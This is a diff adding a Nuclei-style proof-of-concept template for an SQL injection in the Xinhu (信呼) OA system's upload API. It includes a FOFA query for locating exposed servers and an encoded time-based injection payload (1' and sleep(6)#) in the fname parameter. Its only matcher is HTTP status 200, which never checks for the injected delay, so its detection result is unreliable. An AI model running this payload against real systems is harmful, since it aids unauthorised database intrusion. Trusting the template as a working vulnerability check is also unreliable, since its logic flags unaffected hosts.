@@ -1,0 +1,19 @@
+id: poc-rpz2987s55pfu5c5
+info:
+  name: 信呼OA办公系统后台uploadAction存在SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rpz2987s55pfu5c5'
+  tags: sqli,file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rpz2987s55pfu5c5
+    fofa: icon_hash="1652488516"
+http:
+- raw:
+  - GET /xhoa/api.php?a=getmfilv&m=upload|api&d=task&fileid=1&fname=MScgYW5kIHNsZWVwKDYpIw== HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
